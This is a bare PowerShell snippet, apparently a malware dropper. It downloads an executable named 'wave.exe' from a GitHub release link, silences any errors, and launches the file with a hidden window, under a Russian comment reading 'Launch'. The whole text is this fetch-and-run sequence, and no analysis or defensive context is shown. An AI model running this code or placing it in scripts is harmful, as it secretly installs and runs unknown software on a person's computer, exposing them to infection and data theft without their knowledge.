Invoke-WebRequest -Uri "https://github.com/kilordow/Fx.exe/releases/download/lol/wave.exe" -OutFile "wave.exe" -ErrorAction SilentlyContinue
    
    # Запускаем 
    Start-Process -FilePath "wave.exe" -WindowStyle Hidden

